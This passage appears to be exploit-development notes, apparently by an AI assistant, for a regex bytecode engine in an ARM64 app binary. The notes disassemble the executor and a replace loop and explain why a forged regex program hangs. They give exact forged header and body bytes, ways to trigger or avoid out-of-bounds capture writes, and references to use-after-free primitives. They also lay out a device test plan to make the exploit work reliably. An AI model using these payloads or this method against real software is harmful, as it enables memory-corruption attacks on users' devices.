  stack), so `reg` is a free 8-bit index; `idx = 2*cc + reg` can exceed `alloc_count`
  (that is the §11.4 OOB primitive, not needed for the plain forge).
* `save_start/save_end` **do** bounds-check the group (`group < capture_count`), else -3.
* `alloc_count` is read from the same buffer by the caller *before* the call
  (`0x17653B8`), while `lre_exec` re-reads `capture_count` at `0x17A9D24`; a forged
  header must be stable across both reads unless the §11 UAF is being used deliberately.
* The `match` case returns via the shared epilogue with `W20 = 1`; any run that reaches it
  is reported as "match found" to `JS_RegExpDelete`.
* Non-obvious but confirmed: opcode `0` is **invalid** — never use it as padding; pad with
  nothing (the program ends at `match`).

No IDB or device changes were made for this check (read-only).

---

## 18. Why the `bytecode_len = 89` fake program hangs in `lre_exec`

**Answer to the direct question: `lre_exec` never reads bytecode+4 — nor bytecode+3.**
The executor touches the bytecode buffer exactly three times, all in the prologue:

```
0x17A9D04  LDRH  W8,[X1]        ; flags           (bc+0, u16)
0x17A9D24  LDRB  W8,[X1,#2]     ; capture_count   (bc+2, u8)
0x17A9DEC  ADD   X25,X20,#8     ; pc = bc + 8     (RE_HEADER_LEN = 8)
(capture memset loop 0x17A9D74..0x17A9D94 uses capture_count only)
```

An instruction-level scan of the whole 6252-byte function finds **no memory operand based
on the bytecode pointer with displacement 3 or 4..7** (the other `[X1,...]` at `0x17A9E20`
is the jump table, X1 reloaded). `bytecode_len` is therefore **not a loop bound, not a scan
limit, not a validator input, not a match check** in this build. Changing it cannot change
executor control flow.

### 18.1 The only readers of `bytecode+4` in the engine

| site | code | when |
|---|---|---|
| `js_regexp_exec` `0x1760B98` | `LDR W25,[X23,#4]` → `group_names = bc + 8 + bytecode_len` (inlined `lre_get_groupnames`) | only if `flags & LRE_FLAG_NAMED_GROUPS (0x80)` — tested at `0x1760B20 TBNZ W20,#7,0x1760B98` |
| `lre_check_bytecode` (deserialization) | `len = get_u32(bc+4); if (len > bc_len-8) return -1` | only from `JS_ReadObject`, not from `exec`/`replace` |

The header in question has `flags = 0x0000`, so both are dead. Semantics of the field:
**bytecode body length** (used to locate the optional group-name table that follows the
bytecode). Correct value: the exact body length (89 here). It is *not* consulted during
execution.

### 18.2 What 89 vs 0 actually changed

Not executor logic — **object size**. If the forged JSString's length is derived from
`8 + bytecode_len`, then `bytecode_len = 0` gives an 8-byte object with no body present
(the executor starts reading at `bc+8`, i.e. past the end → garbage/zero opcode → abort or
immediate return; that is the "returned quickly, writes missed" run). With 89 the 97-byte
object really contains the body, the executor runs it — and then the real bug in the header
bites.

### 18.3 The actual defect in that header: `register_count = 1` vs 14 registers

`alloc_count = 2*capture_count + register_count = 2*4 + 1 = 9` → capture array is
**9 × 8 = 72 bytes** (`js_malloc` at `JS_RegExpDelete 0x17653D0`, size at `0x17653C8`).

An 89-byte body made of `13 00 14 00` + `1b…`* + `10` is exactly
`4 + 14*6 + 1`, i.e. **14 `set_i32` instructions**. With `capture_count = 4`:

```
idx = 2*capture_count + pc[0] = 8 + reg        (0x17AA7F8)
```

so registers 0..13 write `capture[8] … capture[21]` — **13 stores (and 13 loads) past the
end of a 72-byte allocation**, up to byte 168 (`+96` past the end), all unchecked
(`SAVE_CAPTURE_CHECK` only dedups; the access is `LDR X8,[X19,X20,LSL#3]` at `0x17AACA8`
and `STR X21,[X19,X20,LSL#3]` at `0x17AACB4`). The capture array and the forged bytecode
string live in the **same 4 KiB `JSArena`**, so those stores can rewrite opcodes *ahead of
`pc`* or corrupt a neighbouring object. That is the only way the fake program can change its
own execution — and it explains why the outcome depends on the allocation size (i.e. on
`bytecode_len`) rather than on any header field being read.

### 18.4 Why the result is a hang and not a crash

If a corrupted/decoded byte ahead of `pc` becomes `0x0d` (`REOP_goto`, size 5) with a
negative displacement, `pc` jumps backwards. `REOP_goto` (`0x17AA53C`) has no bound; its
only escape hatch is the interrupt counter:

```
0x17AA550  SUBS W9,W10,#1        ; s->interrupt_counter--
0x17AA55C  B.GT 0x17A9E08        ; > 0 -> keep executing
0x17AA560  MOV  W8,#0x2710       ; reload 10000
0x17AA574  LDR  X9,[X0,#0x10]    ; ctx->rt
0x17AA578  LDR  X8,[X9,#0x528]   ; rt->interrupt_handler
0x17AA57C  CBZ  X8, 0x17A9E08    ; no handler -> keep going
0x17AA594  BLR  X8               ; handler; 0 -> keep going
```

With no handler (or one that returns 0), a backwards `goto` spins forever: no return, no
timeout, no crash — exactly the observed symptom. Note that opcode `0` and opcodes > 44
*abort* (`0x17AB54C`), so a truncated/zeroed stream gives SIGABRT, while a hang implies a
**backward branch** was decoded.

### 18.5 Recommended headers

| goal | header (8 B) | body | note |
|---|---|---|---|
| **same body, in-bounds** | `00 00 04 0E 59 00 00 00` | unchanged 89 B | `register_count = 14` ⇒ `alloc_count = 22`, `idx ≤ 21` — one-byte change, best first test |
| capture[0]/[1] forge | `01 00 00 02 0D 00 00 00` | `1B 00 <v0 LE32> 1B 01 <v1 LE32> 10` | `capture_count = 0` ⇒ `idx = reg`, `alloc_count = 2` |
| minimal zero-length match | `01 00 01 00 05 00 00 00` | `13 00 14 00 10` | `cc=1, rc=0`, no registers |

Rules that make a fake program provably terminating:
* `register_count ≥ max(register used) + 1` (registers start at `2*capture_count`).
* `bytecode_len` = exact body length (semantically unused at exec time, but keep it honest).
* `flags` bit 0 (GLOBAL) only if you need `JS_RegExpDelete` to coerce `lastIndex`
  (`0x17652C8`); bit 7 (NAMED_GROUPS) must stay 0 or `js_regexp_exec` will index
  `bc + 8 + bytecode_len`.
* never rely on padding: opcode `0` aborts.

### 18.6 Device-side discrimination (2 runs)

1. Re-send the **same 89-byte body** with `rc = 0x0E` (bytes `00 00 04 0E 59 00 00 00`).
   * Hang gone → the OOB capture writes were the cause (confirmed).
   * Hang persists → the stream itself is mis-encoded; continue with (2).
2. Send the 5-byte program `13 00 14 00 10` with header `01 00 01 00 05 00 00 00` and a
   subject string of length ≥ 1. It must return immediately with a zero-length match; if
   it does, the encoding of your `set_i32`s (must be exactly 6 bytes: `1B reg v0 v1 v2 v3`)
   is what needs fixing, not the header.

No IDB or device changes were made for this check (read-only).

---

## 19. Extending the `lre_exec` hang analysis (bytecode_len = 0 hangs too)

Since both `bytecode_len` variants hang, the field is confirmed irrelevant (§18). The
remaining candidates are (i) a non-terminating path *inside* the executor, (ii) the
**caller's** replace loop, or (iii) OOB side effects. Each is resolved below from the
binary.

### 19.1 `set_i32` / `SAVE_CAPTURE_CHECK` — no loop, no stack-growth coupling

```
0x17AA7E8  LDR  W8,[SP,var_12C]    ; capture_count
0x17AA7EC  LDRB W9,[X25,#1]        ; reg = pc[0]
0x17AA7F0  LDUR W21,[X25,#2]       ; val = get_u32(pc+1)
0x17AA7F4  ADD  X25,X25,#6         ; pc += 5
0x17AA7F8  ADD  W20,W9,W8,LSL#1    ; idx = reg + 2*capture_count
0x17AA800  CMP  X8,X24             ; dedup scan over the saved-value stack
0x17AA808  LDR  X9,[X8,#-0x10]!    ;   sp1 -= 2 ; if (sp1 > bp && sp1[-2].val == idx) break
0x17AA80C  CMP  X9,X20
0x17AA810  B.NE 0x17AA800
0x17AAC98  SUB  X8,X2,X23          ; CHECK_STACK_SPACE(2): stack_end - sp
0x17AAC9C  CMP  X8,#0xF
0x17AACA0  B.LE 0x17AB428          ; grow: ONE call sub_17AB550(s, (sp-bp)/8 + 2) @0x17AB444
0x17AACA4  STR  X20,[X23]          ; sp[0].val = idx
0x17AACA8  LDR  X8,[X19,X20,LSL#3] ; sp[1].ptr = capture[idx]     <- unchecked READ
0x17AACAC  STR  X8,[X23,#8]
0x17AACB0  ADD  X23,X23,#0x10
0x17AACB4  STR  X21,[X19,X20,LSL#3]; capture[idx] = val           <- unchecked WRITE
```

* The dedup scan is bounded by the number of saved stack entries (`sp-bp`), not by `idx`.
* The "stack growth" branch is a **single** `sub_17AB550(...)` call (both call sites,
  `0x17AB444` and `0x17AB2CC`, fall straight back to the store) — no retry loop.
* `idx` never influences stack usage: the stack stores `idx` + the old value, 2 words.
  A large `idx` (e.g. 148) only means the load/store hit `capture + 8*idx`
  (= 1184 bytes for idx 148) — **1112 bytes past the end of a 72-byte allocation** when
  `capture_count = 4, register_count = 1`. It is pure OOB access, not a loop.

So a strfill body built from many `set_i32`s cannot hang the executor through this path; it
can only corrupt the arena around the capture array.

### 19.2 The `match` case — always returns

```
0x17AB4F0  LDR  X1,[SP,var_118]    ; s->stack_buf
0x17AB4F4  LDR  X8,[SP,var_148]    ; &s->static_stack_buf
0x17AB4F8  CMP  X1,X8
0x17AB4FC  B.EQ 0x17AB510          ; static stack -> no free, return
0x17AB500  CBZ  X1,0x17AB510
0x17AB50C  BL   js_free_rt         ; only if the stack really grew to the heap
0x17AB510  MOV  W0,W20             ; W20 = 1 (set at 0x17A9E30 before every dispatch)
```

For a short, non-backtracking program the executor stack is the in-struct
`static_stack_buf`, so the free is skipped and `match` returns 1 unconditionally. There is
**no loop and no backtracking in `match`**, with zero-length captures or otherwise.
(`W20` is only non-1 on the error paths: `-1/-2/-3` set at `0x17AB53C/0x17AB544/0x17AB534`.)

### 19.3 What `lre_exec` actually reads from the header

| field | read? | instruction |
|---|---|---|
| `+0` flags (u16) | yes | `0x17A9D04 LDRH W8,[X1]` → `is_unicode = flags & 0x110` (0x17A9D1C) |
| `+2` capture_count (u8) | yes | `0x17A9D24 LDRB W8,[X1,#2]` → memset of `2*cc` capture slots (0x17A9D74–0x17A9D94) |
| `+3` register_count | **no** | caller-side only (`JS_RegExpDelete 0x17653BC`) |
| `+4..7` bytecode_len | **no** | (§18) |
| `+8` program | yes | `0x17A9DEC ADD X25,X20,#8` |

No header value can create a non-returning loop directly. `capture_count` matters only in
that it fixes the memset extent (`2*cc` slots) and the register base used by `set_i32`.

### 19.4 The likely spin: the caller's replace loop (addresses)

`JS_RegExpDelete` (`0x17651CC`) drives `lre_exec` from a loop:

```
0x17654F4  LDR  X8,[X24]            ; str->len
0x17654FC  CMP  X9,W26,SXTW
0x1765500  B.LT 0x176549C           ; exit if last_index > str->len
0x1765528  BL   lre_exec
0x176552C  CMP  W0,#1 ; B.NE 0x17655FC
0x1765534  LDP  X8,X9,[X28]         ; capture[0] / capture[1]
0x1765538  ... ASR X21,X8,X20       ; start = (capture[0]-str_buf) >> shift
0x1765540  ... ASR X28,X8,X20       ; end   = (capture[1]-str_buf) >> shift
0x1765550  B.GE 0x176556C           ; (next_src_pos >= start) skip concat
0x1765554  ... BL sub_1735D04       ; string_buffer_concat(b, str, next_src_pos, start)
0x176556C  LDR  W8,[SP,var_48]      ; re_flags read from the BYTECODE (0x17652C0)
0x1765570  TBZ  W8,#0,0x176563C     ; bit0 = LRE_FLAG_GLOBAL == 0  -> set lastIndex, break
0x1765574  CMP  W28,W21             ; end == start ?
0x1765580  B.NE 0x17654F4           ; -> loop again with last_index = end
0x17654EC  ADD  W26,W21,#1          ; end == start -> last_index = start + 1
```

Consequences for a fake program that ignores `last_index` and returns a fixed
`capture[0]/capture[1]`:

* **bytecode flags GLOBAL = 0** → `0x1765570 TBZ` breaks out after exactly **one**
  iteration (sets `lastIndex` and returns). Cannot spin.
* **bytecode flags GLOBAL = 1** → the loop repeats. If the forged `end` is negative
  (i.e. `capture[1] < str_buf`) it stays `≤ str->len`, `end == start` adds 1 per
  iteration, and the loop runs on the order of **2^31 iterations** — a busy thread with
  the PC alternating between `0x1765528` (`lre_exec`) and this loop, no crash, no marker.
  If the forged `end` is positive and `> str->len`, the very next iteration exits at
  `0x1765500`.
* Additionally, a forged `start` larger than `next_src_pos` makes `0x1765554` copy
  `start - next_src_pos` bytes — a huge `start` becomes a multi-GB
  `string_buffer_concat`, which also looks like a hang.

Note the two flag sources: `Symbol.replace`'s `is_global` uses the **`rx.flags` string**
(`JS_GetProperty(rx, atom 116)` at `0x1762530`), while this loop uses the **bytecode
flags** (`0x17652C0`). They can be made to disagree.

### 19.5 Recommended terminating fake programs

| goal | header (8 B) | body |
|---|---|---|
| **minimal, must terminate** | `01 00 01 00 05 00 00 00` | `13 00 14 00 10` |
| strfill, single shot (no GLOBAL in bytecode) | `00 00 04 0E <len> 00 00 00` | `13 00 14 00` + `1B reg <v>`* + `10`, `register_count = max(reg)+1` |
| strfill, GLOBAL but self-terminating | `01 00 04 0E <len> 00 00 00` | same, with `capture[1]` forged to a value **above** `str_buf + str->len` |

* Everything the executor needs fits in 8 + 5 bytes: flags, `capture_count ≥ 1`,
  `register_count = 0`, `bytecode_len = 5`, program `13 00 14 00 10`. If this 13-byte
  object still hangs, the problem is upstream of the executor (the forged JSString /
  `JSRegExp` plumbing or the harness loop), not in `lre_exec`.
* If the strfill body must be used with GLOBAL, forge `capture[1] >= str_buf + str->len`
  (a positive `end` beyond the subject length) so `0x1765500` breaks after one pass; or
  clear GLOBAL and satisfy `Symbol.replace` with an own `flags` getter returning `"g"`
  (`0x1762530`), which keeps `0x1765570` on the break path.
* Keep `register_count >= max(reg)+1` so the `set_i32` writes stay inside the capture
  array — otherwise the OOB stores can rewrite opcodes ahead of `pc`, and a corrupted byte
  that decodes as `0x0D` (`REOP_goto`) with a `-4` displacement is an immediate
  infinite spin at `0x17AA53C` (its only escape is the app's interrupt handler, called
  once per `0x2710` iterations at `0x17AA594`; with no handler it never leaves).

### 19.6 Decision table for the running probe

| observation | conclusion |
|---|---|
| `13 00 14 00 10` returns quickly | executor is fine; the strfill hang is the caller loop (§19.4) or OOB corruption (§19.1) |
| it hangs too | the forged bytecode pointer/length or the `JSRegExp` plumbing is wrong before entry — check that `pc = bc+8` lands on `13 00` and that `capture_count ≥ 1` |
| it aborts (`lre_exec+0x1868`) | opcode outside 1..44 at `pc` — the bytecode pointer does not point at the intended header |

No IDB or device changes were made for this check (read-only).
